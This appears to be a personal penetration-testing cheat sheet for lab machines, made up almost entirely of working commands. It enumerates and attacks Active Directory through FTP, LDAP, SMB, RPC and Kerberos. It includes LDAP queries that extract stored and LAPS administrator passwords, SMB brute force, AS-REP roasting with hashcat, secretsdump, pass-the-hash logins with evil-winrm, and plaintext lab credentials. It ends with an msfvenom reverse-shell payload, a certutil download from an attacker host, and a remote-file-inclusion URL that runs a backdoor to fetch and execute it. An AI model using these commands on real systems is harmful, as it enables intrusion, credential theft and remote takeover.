FTP:
	ftp 192.168.153.130
	ls -all        <- check all files an also use gui login
	can login using anonymous  but also use hydra to get other creds  on ftp


LDAP:
	kali@kali:~# ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.178.122 > ldapOut.txt      // <-- best works ;)   ;  search  in field "description: "Passwords/passwords/Pass/pass"  

	kali@kali:~#    ldapsearch -H "ldap://192.168.214.122" -v  -x -b "DC=testAuthSome,DC=offsec"  "(objectclass=*)"                <-- check if  password in descriptions   
	kali@kali:~#	ldapsearch -v -x -b "DC=testAuthSome,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"     < -- check if password in descriptions 

	kali@kali:~# ldapsearch -H 10.10.10.161 -x -b "DC=htb,DC=local" > ldapFile.txt         <- then you can grep file ldapFile.txt 
	or
	kali@kali:~# ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldapFile.txt         <- then you can grep file ldapFile.txtx\ 

	kali@kali:~# ldapsearch -H 10.10.10.161 -x -b "DC=htb,DC=local"  'objectClass=Person'      <- only prints with people/person    

	kali@kali:~# ldapsearch -H 10.10.10.161 -x -b "DC=htb,DC=local"  '(objectClass=User)'    sAMAccountName | grep sAMAccountName |     awk  '{print $2}' > userlist.ldap      <-- get users

	get users:
	ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local"  'objectClass=Person' sAMAccountName |grep sAMAccountName

	if bad config i proving grounds example:
	LAPS is a tool that periodically changes the local administrator's password when it expires. It then stores the password details in the Active Directory. Using the credentials we have already found 		(fmcsorley:CrabSharkJellyfish192), let's attempt to query LDAP for the local administrator password.
		$ ldapsearch -x -H 'ldap://192.168.214.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
		psexec to login
		/usr/share/doc/python3-impacket/examples/psexec.py hutch.offsec/administrator:'sMDQxC@3YX7V/r'@192.168.214.122

	Password from LDAP:
		ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local"  'objectClass=Person' 
		cascadeLegacyPwd: clk0bjVldmE=
		echo clk0bjVldmE= | base64 -d


SMB:
	kali@kali:~# crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''     				<-  blank user and password
	kali@kali:~# crackmapexec smb 10.10.10.161 --pass-pol -u 'administrator' -p 'password'      	<-   user:adinistrator and password: password

	kali@kali:~# crackmapexec smb 10.10.10.161 --pass-pol -u useLint.txt  -p passwordList.txt      	<-  brute force login to smb if you ge sernames

	kali@kali:~# enum4linux 10.10.10.161 									<- enum4linux  is old but can give you users
	kali@kali:~# enum4linux 192.168.195.175


	kali@kali:~# smbclient -L //10.0.10.100
	
	kali@kali:~# smbmap -H 10.10.10.100

	kali@kali:~# smbclient //10.10.10.100/DirInSMB
	

	log using creds:
	kali@kali:~# crackmapexec smb 10.10.10.161 -u svc-alfresco-user -p Password --shares


	crackmapexec smb  10.10.11.108 -u  svc-printer  -p '1edFg43012!!'
	./crackmapexec.py smb  10.10.11.108 -u  svc-printer  -p '1edFg43012!!'

	crackmapexec winrm  10.10.11.108 -u  svc-printer  -p '1edFg43012!!'
	./crackmapexec.py winrm  10.10.11.108 -u  svc-printer  -p '1edFg43012!!'

	evil-winrm -i 10.10.11.108 -u  svc-printer  -p '1edFg43012!!'




RPC: 
	kali@kali:~# rpcclient -U '' 10.10.10.161 			
	or 
	rpcclient -N -U '' 10.10.10.161
	try:
	rpcclient -W '' -c querydispinfo -U''%'' '192.168.214.175' 
	rpcclient $> enumdom                                              					<- enum users
	....
	rpcclient $> enumdomusers
		also:	
		enume groups
	
	rpcclient -W '' -c querydispinfo -U''%'' '192.168.86.175' 

KERBEROS:
	kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 potential_usernames.txt


ATTACK:
impacket-tools (/usr/share/doc/pyton3-impackey/examples    /opt/impacket/ ):
	
	kali@kali:~# GetADUsers.py -all active.htb/svc_tags -dc-ip 10.10.10.100				<- active.htb/svc_tags  - user  ; can  will ask for password 

	kali@kali:~#  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL                <- if you have SYSTEM and *.dit file

	kali@kali:~# GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -forma hashcat			<- then you can crack received data: 
							#hashcat -m 18200 hashes/svc-alfresco /opt/wordlist/rockyou -r rules/InsidePro-PasswordPro.rule
	or
	kali@kali:~# impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161
	
	

wsman (port 5985)
login using creds :
	kali@kali:~# cd /opt/evil-winrm/
	kali@kali:~# ./evil-winrm.rb -u svc-alfresco -p Password -i 10.10.10.161
	kali@kali:~# evil-winrm -i 192.168.86.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

	crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
		or
	crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
		or (if port 5985)
	evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161




RevShell PHP not workin:
	https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

this works:
	https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php


also can:
	create rev shell:
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=4242 -f exe > reverse.exe

	certutil to decode:
			certutil.exe -urlcache -f http://192.168.45.237/reverse.exe reverse.exe

	and now rfi - remote file inclusion:
	http://192.168.244.53:8080/site/index.php?page=http://192.168.45.237:443/simple-backdoor.php&cmd=certutil.exe%20-urlcache%20-f%20http://192.168.45.237:443/reverse.exe%20reverse.exe 


